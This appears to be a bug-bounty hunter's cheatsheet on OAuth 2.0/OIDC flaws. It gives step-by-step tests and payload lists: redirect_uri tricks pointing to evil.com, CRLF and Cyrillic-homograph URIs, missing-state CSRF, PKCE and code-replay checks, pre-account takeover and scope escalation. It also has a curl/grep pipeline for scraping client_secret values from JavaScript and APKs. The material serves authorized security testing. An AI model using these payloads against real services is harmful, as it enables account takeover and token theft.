---
tags: [bugbounty, vuln/oauth, cheatsheet, p1, p2]
aliases: [OAuth, OAuth 2.0, OIDC, SSO]
cssclasses: [bb-hunter]
updated: 2026-04-21
---

# OAuth 2.0 / OIDC Attacks

> [!tldr] Hunter Summary
> **What:** Flaws in OAuth 2.0/OIDC authorization flows — token theft, CSRF, ATO.
> **Impact:** Full account takeover of victim accounts. P1.
> **Best targets:** Any SSO feature, "Login with Google/GitHub/Facebook", social account linking.
> **Time to triage:** Map the full flow in Burp, 20–30 min for thorough coverage.

---

## Where to Hunt

| Signal | Look for |
|--------|----------|
| SSO buttons | "Login with Google/GitHub/Facebook/Apple" |
| URL patterns | `/authorize?response_type=code&client_id=...&redirect_uri=...` |
| Parameters | `redirect_uri`, `state`, `code`, `nonce`, `scope`, `client_secret` |
| Account linking | "Connect your X account" |
| Implicit flow leftovers | `response_type=token` (deprecated but found in legacy apps) |
| Error messages | "Invalid redirect_uri" tells you exact match validation is in place |

---

## Step-by-Step Hunt

### Step 1 — Fingerprint the OAuth flow
```
GET /authorize?
  response_type=code          ← authorization code (most common)
  &client_id=abc
  &redirect_uri=https://app.com/callback
  &scope=openid profile email
  &state=random_csrf_token
  &code_challenge=...         ← PKCE (public clients)
  &code_challenge_method=S256
```

Variations to note:
- `response_type=token` → implicit flow (deprecated, still found)
- `response_type=id_token` → OIDC
- No `state` → login CSRF possible
- No `code_challenge` → PKCE missing → code theft possible

### Step 2 — Test redirect_uri manipulation
The server may be doing prefix match, path match, or exact match. Test all:

```
# Registered: https://app.target.com/callback

# Try these:
&redirect_uri=https://app.target.com.evil.com/callback        (suffix add)
&redirect_uri=https://app.target.com/callback/../secret        (path traverse)  
&redirect_uri=https://app.target.com/callback%0a%0d            (CRLF inject)
&redirect_uri=https://evil.com%23@app.target.com/callback      (fragment abuse)
&redirect_uri=https://app.target.com/callback?extra=../evil    (param pollution)

# If open redirect exists on target:
&redirect_uri=https://app.target.com/logout?next=https://evil.com

# Subdomain wildcard? Try subdomain takeover:
&redirect_uri=https://subdomain.target.com/callback  (if subdomain is takeable)

# IDN homograph (Cyrillic lookalikes):
&redirect_uri=https://аpp.target.com/callback  (а = Cyrillic a)
```

### Step 3 — Test state parameter (CSRF)
```
# Remove state entirely
GET /authorize?response_type=code&client_id=X&redirect_uri=Y&scope=Z
# (no state param)
# If you can complete the flow: login CSRF possible

# Use same state twice — test reuse
# Use predictable state like md5(timestamp)

# Exploit: craft authorization URL → send to victim → victim's account linked to attacker's
```

### Step 4 — Test PKCE
```
# Start flow with code_challenge, but redeem without code_verifier:
POST /token
grant_type=authorization_code
&code=AUTH_CODE
&redirect_uri=https://app.com/callback
&client_id=X
# no code_verifier
# If token issued: PKCE not enforced → authorization code theft = ATO
```

### Step 5 — Test code reuse
After getting an authorization code in `/callback?code=X`, use it again:
```bash
POST /token
grant_type=authorization_code&code=X&...
# Again:
POST /token
grant_type=authorization_code&code=X&...
# If second call succeeds → code replay possible
```

### Step 6 — Test implicit flow token in URL
If `response_type=token`:
```
# Token appears in fragment: https://app.com/callback#access_token=XXX
# Check: is it leaked in Referer header to third-party resources on the page?
# Check: browser history, server access logs
```

### Step 7 — Pre-account takeover
1. Attacker creates account on target using victim's email via normal signup
2. Victim tries to sign in with OAuth (Google) — target links account to attacker's existing account
3. Attacker now controls victim's "linked" account

OR reverse: attacker pre-creates OAuth-linked account, victim signs up with email/password.

### Step 8 — client_secret leak
```bash
# Check JS source files for client_secret
grep -r "client_secret" --include="*.js" .
gau target.com | grep "\.js$" | httpx -mc 200 | xargs -I{} curl -s {} | grep "client_secret"

# Check Android APK / iOS IPA
apktool d app.apk && grep -r "client_secret" app/
```

---

## Payload Quick Ref

```
# redirect_uri variants (adjust registered URI)
https://target.com/callback.evil.com/
https://evil.com%23@target.com/callback
https://target.com/callback/../evil.com
https://target.com/callback?next=https://evil.com

# state CSRF — just remove the param
GET /authorize?response_type=code&client_id=X&redirect_uri=Y

# IDN homograph
https://аpplication.target.com/callback  (spot the Cyrillic 'а')

# Scope escalation
scope=openid email profile admin
scope=openid+email+profile+write:*
```

---

## 2025-2026 Updates

> [!info] New OAuth attack surface (2025-2026)
> - **AI OAuth integrations:** "Connect your ChatGPT/Claude/Copilot" SSO — these are new code paths with minimal security review. state param often missing.
> - **Token binding bypass:** Some OAuth servers claim to use DPoP (RFC 9449) but don't validate the proof. Test by replaying access tokens without the proof JWT.
> - **Device flow abuse:** `urn:ietf:params:oauth:grant-type:device_code` — user_code brute-force if not rate-limited (6-character alphanumeric = 2.2B combos but can be short)
> - **PKCE downgrade:** Server supports both PKCE and non-PKCE. If you initiate flow without PKCE params, some servers fall back silently.
> - **Refresh token rotation bypass:** Some servers issue new refresh token but old one remains valid — infinite session.

---

## Chain Ideas

| OAuth bug → | Result |
|-------------|--------|
| redirect_uri manipulation | → Auth code theft → ATO |
| Missing state | → Login CSRF → victim's session linked to attacker's account |
| PKCE not enforced | → Code theft (via Referer, proxy) → ATO |
| client_secret leak | → Token forging → bypass auth |
| Pre-account takeover | → Victim account owned before they sign up |

---

## Tools

| Tool | Use |
|------|-----|
| Burp Suite | Intercept and replay OAuth flows |
| `jwt_tool` | If JWT tokens are used as access tokens |
| `oauth-toolkit` | Burp extension for OAuth testing |

---

## References

- PortSwigger OAuth attacks — https://portswigger.net/web-security/oauth
- RFC 6749 — OAuth 2.0
- RFC 7636 — PKCE
- OAuth Security BCP (RFC 9700)
